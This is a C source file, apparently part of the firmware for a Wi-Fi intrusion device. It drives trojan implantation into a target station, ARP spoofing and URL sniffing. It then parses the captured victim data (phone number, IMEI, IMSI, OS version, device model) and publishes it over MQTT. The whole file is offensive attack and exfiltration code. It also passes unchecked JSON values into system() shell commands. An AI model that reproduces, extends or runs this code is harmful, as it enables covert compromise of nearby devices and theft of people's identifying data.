/*
 * wifi_trojan.c
 *
 *  Created on: 2020-7-12
 *      Author: andy
 */

#include "wifi_trojan.h"
#include "wifi_access.h"

#include "../Mqtt/MqttProcess.h"
#include "status.h"

uint8_t urlsniffer_data[1024*100];

Url_Sniffer_Data g_turl_data;

/*****************************************************************
* 函数描述: 植入操作
* 参数：    cJSON* ap ap植入的参数，
* 			cJSON* sta sta植入的参数
* 			CJSON* para 植入文件的参数
* 			uint8_t op_code 1 开始植入
* 							其他 停止植入
* 返回值：  无
****************************************************************/
void start_stojan(cJSON* ap,cJSON* sta,cJSON* para,uint8_t op_code)
{
	char cmdbuf[128];
	char json_type=0;
	int js_size=0;
	char *band =NULL,*mac=NULL;
	uint8_t ucchl=0;
	uint8_t uc_type=0;
	memset(cmdbuf,0,sizeof(cmdbuf));
	//sprintf(cmdbuf,"zr_start.sh %s channel %d",PcapInterface[ucchl],WifiDecrypt.channel);//控制网卡信道切换
	//system(cmdbuf);
	if(op_code == 1){
		if(!ap ||!sta||!para){
			printf("stojan2 error\n");
			return ;
		}
	}
	else{
		if(!sta){
			printf("stojan2 error\n");
			return ;
		}
	}
	if(op_code == 1){
		js_size =cJSON_GetArraySize(ap);
		for (int i=0;i<js_size;i++){
			json_type = cJSON_GetArrayItem(ap, i)->type;
			if(json_type == cJSON_String){
				if(strcmp(cJSON_GetArrayItem(ap, i)->string,"band") == 0){
						band = cJSON_GetArrayItem(ap, i)->valuestring;
						if(strcmp(band,"2.4") ==0){
							ucchl = 0 ;
						}
						else if(strcmp(band,"5.8") ==0){
							ucchl = 1;
						}
				}
			}
		}
	}
	cJSON* sta_mac = cJSON_GetObjectItem(sta, "mac");
	if(sta_mac != NULL){
		cJSON* mac_item = cJSON_GetArrayItem(sta_mac, 0);
		if(mac_item != NULL){
			mac = cJSON_GetArrayItem(sta_mac, 0)->valuestring;
		}
	}
	if(op_code == 1){
		js_size = cJSON_GetArraySize(para);
		for (int i=0;i<js_size;i++){
			json_type = cJSON_GetArrayItem(para, i)->type;
			printf("json_type %d\n",json_type);
			if(json_type == cJSON_String){
				if(strcmp(cJSON_GetArrayItem(para, i)->string,"mmType") == 0){
					uc_type = atoi((const char *)cJSON_GetArrayItem(para, i)->valuestring);
					printf("mmtype %d\n",uc_type);
				}
			}
		}
	}
	if(op_code == 1){
		sprintf(cmdbuf,"zr_start.sh %s %s %d &",PcapInterface[ucchl],mac,uc_type);
		printf("%s\n",cmdbuf);
		if(WifiAccess.mode ==ACCESS_MODE_AP_SUCC){
			update_status("staTrojan", "status-run", "staAttach");
		}
		else if(WifiAccess.mode ==ACCESS_MODE_STA_SUCC){
			update_status("staTrojan", "status-run", "apAccess");
		}
	}
	else
	{
		sprintf(cmdbuf,"zr_stop.sh %s %s",PcapInterface[ucchl],mac);
	}
	system(cmdbuf);
}
/*****************************************************************
* 函数描述: arp欺骗操作
* 参数：    cJSON* ap ap json 参数
* 		   cJSON* sta  sta json 参数
* 		   uint8_t op_code 1 开始植入
* 							其他 停止植入
* 返回值：  无
****************************************************************/
void start_arp_op(cJSON* ap,cJSON* sta,uint8_t op_code)
{
	char cmdbuf[128];
	int js_size=0;
	char json_type=0;
	char *band =NULL,*mac=NULL;
	uint8_t ucchl=0;
	if(op_code == 1){
			if(!ap ||!sta){
				printf("arp error\n");
				return ;
		}
	}
	else{
		if(!sta){
			printf("arp error\n");
			return ;
		}
	}
	if(op_code == 1){
		js_size =cJSON_GetArraySize(ap);
		for (int i=0;i<js_size;i++){
			json_type = cJSON_GetArrayItem(ap, i)->type;
			if(json_type == cJSON_String){
				if(strcmp(cJSON_GetArrayItem(ap, i)->string,"band") == 0){
						band = cJSON_GetArrayItem(ap, i)->valuestring;
						if(strcmp(band,"2.4") ==0){
							ucchl = 0 ;
						}
						else if(strcmp(band,"5.8") ==0){
							ucchl = 1;
						}
				}
			}
		}
	}
	js_size = cJSON_GetArraySize(sta);
	for (int i=0;i<js_size;i++){
		json_type = cJSON_GetArrayItem(sta, i)->type;
		if(json_type == cJSON_String){
			if(strcmp(cJSON_GetArrayItem(sta, i)->string,"mac") == 0){
				mac = cJSON_GetArrayItem(sta, i)->valuestring;
			}
		}
	}
	if(op_code == 1){
		sprintf(cmdbuf,"arp_deception %s %s %d &",PcapInterface[ucchl],mac,0);
		printf("%s\n",cmdbuf);
		system(cmdbuf);
		if(WifiAccess.mode ==ACCESS_MODE_AP_SUCC){
			update_status("staArp", "status-run", "staAttach");
		}
		else if(WifiAccess.mode ==ACCESS_MODE_STA_SUCC){
			update_status("staArp", "status-run", "apAccess");
		}
	}
	else{
		sprintf(cmdbuf,"arp_deception stop &");
		printf("%s\n",cmdbuf);
		system(cmdbuf);
	}
}
/*****************************************************************
* 函数描述: 截获操作
* 参数：     cJSON* ap ap截获的参数，
* 			cJSON* sta sta截获的参数
* 			CJSON* para 截获id的参数
* 			uint8_t op_code 1 开始截获
* 							其他 停止截获
* 返回值：  无
****************************************************************/
void start_url_sniffer(cJSON* ap,cJSON* sta,cJSON* id,uint8_t op_code)
{
	char cmdbuf[128];
	char filename[256];
	char json_type=0;
	int js_size=0;
	char *band =NULL,*mac=NULL;
	uint8_t ucchl=0;
	if(op_code == 1){
		if(!ap || !sta ||!id){
			return ;
		}
	}
	else{
	}
	if(op_code == 1){ //开始截获
		memset(&g_turl_data,0,sizeof(g_turl_data));
		strcpy(g_turl_data.id_str,id->valuestring);

		js_size =cJSON_GetArraySize(ap);
		for (int i=0;i<js_size;i++){
			json_type = cJSON_GetArrayItem(ap, i)->type;
			if(json_type == cJSON_String){
				if(strcmp(cJSON_GetArrayItem(ap, i)->string,"band") == 0){
					band = cJSON_GetArrayItem(ap, i)->valuestring;
					if(strcmp(band,"2.4") ==0){
						ucchl = 0 ;
					}
					else if(strcmp(band,"5.8") ==0){
						ucchl = 1;
					}
				}
			}
		}
		cJSON* sta_mac = cJSON_GetObjectItem(sta, "mac");
		if(sta_mac != NULL){
			cJSON* mac_item = cJSON_GetArrayItem(sta_mac, 0);
			if(mac_item != NULL){
				mac = cJSON_GetArrayItem(sta_mac, 0)->valuestring;
			}
		}

		g_turl_data.uc_urlsniffer_flag=1;
		sprintf(cmdbuf,"url_sniffer %s %s %s &",PcapInterface[ucchl],mac,g_turl_data.id_str);
		printf("%s\n",cmdbuf);
		system(cmdbuf);
		if(WifiAccess.mode ==ACCESS_MODE_AP_SUCC){
			update_status("staCapture", "status-capture", "staAttach");
		}
		else if(WifiAccess.mode ==ACCESS_MODE_STA_SUCC){
			update_status("staCapture", "status-capture", "apAccess");
		}
	}
	else
	{
		memset(&g_turl_data,0,sizeof(g_turl_data));
		strcpy(g_turl_data.id_str,id->valuestring);
		sprintf(cmdbuf,"url_sniffer stop %s &",g_turl_data.id_str);
		printf("%s\n",cmdbuf);
		system(cmdbuf);
		sprintf(filename,"rm -f /tmp/url_%s.json",g_turl_data.id_str);
		printf("%s\n",filename);
		system(filename);
	}
}
/*****************************************************************
* 函数描述: 截获文本解析
* 参数：    无
* 返回值：  无
****************************************************************/
#if 1
void url_sniffer_parse()
{
	FILE*  fp;
	char   filename[256];
	int    size = 0, readsize = 0;
	cJSON *root, *array, *array_item;
	char   json_type = 0;
	char   out_str[1024], tmp[128];

	sprintf(filename, "/tmp/url_%s.json", g_turl_data.id_str);
	printf("%s\n", filename);
	    // json路径
	if ((fp = fopen(filename, "r")) == NULL) {
	        // perror("read file url file err\n");
	        return;
	}
	while (!feof(fp)) {
	        size = fread(urlsniffer_data + readsize, 1024, 64, fp);
	        if (size < 1024) { break; }
	        readsize += size;
	}
	fclose(fp);
	printf("url data:%s\n", urlsniffer_data);
	root = cJSON_Parse((const char*)urlsniffer_data);
	if (!root) {
		perror("url configuration parse error\n");
		return;
	}
	sprintf(out_str, "{\"sn\":%d,", DeviceSN);
	printf("%s\n", out_str);
	size = cJSON_GetArraySize(root);
	for (int i = 0; i < size; i++) {
	        json_type = cJSON_GetArrayItem(root, i)->type;
	        if (json_type == cJSON_Array) {
	            array = cJSON_GetArrayItem(root, i);
	            if (strcmp(array->string, "mac") == 0) {  //解析操作系统
	                array_item = cJSON_GetArrayItem(array, 0);
	                if (array_item != NULL) {
	                    sprintf(tmp, "\"staMac\":\"%s\",", array_item->valuestring);
	                    printf("%s\n", tmp);
	                    strcat(out_str, tmp);
	                } else {
	                    sprintf(tmp, "\"mac\":\"\",");
	                    printf("%s\n", tmp);
	                    strcat(out_str, tmp);
	                }
	            } else if (strcmp(array->string, "tel") == 0) {  //解析手机号
	                array_item = cJSON_GetArrayItem(array, 0);
	                if (array_item != NULL) {
	                    sprintf(tmp, "\"tel\":\"%s\",", array_item->valuestring);
	                    printf("%s\n", tmp);
	                    strcat(out_str, tmp);
	                } else {
	                    sprintf(tmp, "\"tel\":\"\",");
	                    printf("%s\n", tmp);
	                    strcat(out_str, tmp);
	                }
	            } else if (strcmp(array->string, "imei") == 0) {  //解析手机号
	                array_item = cJSON_GetArrayItem(array, 0);
	                if (array_item != NULL) {
	                    sprintf(tmp, "\"imei\":\"%s\",", array_item->valuestring);
	                    printf("%s\n", tmp);
	                    strcat(out_str, tmp);
	                } else {
	                    sprintf(tmp, "\"imei\":\"\",");
	                    printf("%s\n", tmp);
	                    strcat(out_str, tmp);
	                }
	            } else if (strcmp(array->string, "imsi") == 0) {  //解析手机号
	                array_item = cJSON_GetArrayItem(array, 0);
	                if (array_item != NULL) {
	                    sprintf(tmp, "\"imsi\":\"%s\",", array_item->valuestring);
	                    printf("%s\n", tmp);
	                    strcat(out_str, tmp);
	                } else {
	                    sprintf(tmp, "\"imsi\":\"\",");
	                    printf("%s\n", tmp);
	                    strcat(out_str, tmp);
	                }
	            } else if (strcmp(array->string, "Platform") == 0) {
	                array_item = cJSON_GetArrayItem(array, 0);
	                if (array_item != NULL) {
	                    sprintf(tmp, "\"os\":\"%s\",", array_item->valuestring);
	                    printf("%s\n", tmp);
	                    strcat(out_str, tmp);
	                } else {
	                    sprintf(tmp, "\"os\":\"\",");
	                    printf("%s\n", tmp);
	                    strcat(out_str, tmp);
	                }
	            } else if (strcmp(array->string, "OS_ver") == 0) {
	                array_item = cJSON_GetArrayItem(array, 0);
	                if (array_item != NULL) {
	                    sprintf(tmp, "\"version\":\"%s\",", array_item->valuestring);
	                    printf("%s\n", tmp);
	                    strcat(out_str, tmp);
	                } else {
	                    sprintf(tmp, "\"version\":\"\",");
	                    printf("%s\n", tmp);
	                    strcat(out_str, tmp);
	                }
	            }else if (strcmp(array->string, "dev") == 0) {//  增加设备型号字段 20201128
	            	sprintf(tmp,"\"dev\":%s",cJSON_Print(array));
//	            	strcpy(tmp,cJSON_Print(array));
	            	strcat(out_str, tmp);
				}
	        }
	    }
	    strcat(out_str, "}");
	    printf("jh buf :%s\n", out_str);
	    mqtt_publish_msg(MQTT_TOPIC_JH, (uint8_t *)out_str, strlen(out_str));
	//	mqtt_publish_msg(MQTT_TOPIC_JH,(uint8_t *)publish_msg,strlen(publish_msg));
	    cJSON_Delete(root);
}
#else
/*****************************************************************
* 函数描述: 截获文本解析
* 参数：    无
* 返回值：  无
****************************************************************/
void url_sniffer_parse()
{
	char filename[128];
	char cmd[128];
	char stdoutput[128];
	char publish_msg[256];
	char * strtail = publish_msg;


	sprintf(filename, "/tmp/url_%s.json", g_turl_data.id_str);
	sprintf(cmd, "jsonfilter -i %s -e \"@.mac[0]\"", filename);
	sys_get(cmd, stdoutput, sizeof(stdoutput));
	strtail += sprintf(strtail, "{\"sn\":%d,", DeviceSN);
	strtail += sprintf(strtail, "\"staMac\":");
	strtail += sprintf(strtail, "\"%s\",", stdoutput);

	sprintf(cmd, "jsonfilter -i %s -e \"@.Platform[0]\"", filename);
	sys_get(cmd, stdoutput, sizeof(stdoutput));
	strtail += sprintf(strtail, "\"os\":");
	strtail += sprintf(strtail, "\"%s\",", stdoutput);

	sprintf(cmd, "jsonfilter -i %s -e \"@.OS_ver[0]\"", filename);
	sys_get(cmd, stdoutput, sizeof(stdoutput));
	strtail += sprintf(strtail, "\"version\":");
	strtail += sprintf(strtail, "\"%s\",", stdoutput);

	sprintf(cmd, "jsonfilter -i %s -e \"@.tel[0]\"", filename);
	sys_get(cmd, stdoutput, sizeof(stdoutput));
	strtail += sprintf(strtail, "\"tel\":");
	strtail += sprintf(strtail, "\"%s\",", stdoutput);

	sprintf(cmd, "jsonfilter -i %s -e \"@.imei[0]\"", filename);
	sys_get(cmd, stdoutput, sizeof(stdoutput));
	strtail += sprintf(strtail, "\"imei\":");
	strtail += sprintf(strtail, "\"%s\",", stdoutput);

	sprintf(cmd, "jsonfilter -i %s -e \"@.imsi[0]\"", filename);
	sys_get(cmd, stdoutput, sizeof(stdoutput));
	strtail += sprintf(strtail, "\"imsi\":");
	strtail += sprintf(strtail, "\"%s\",", stdoutput);

	*(--strtail) = '}'; // remove the last ","
	printf("jh buf :%s\n", publish_msg);
	mqtt_publish_msg(MQTT_TOPIC_JH,(uint8_t *)publish_msg,strlen(publish_msg));
}
#endif
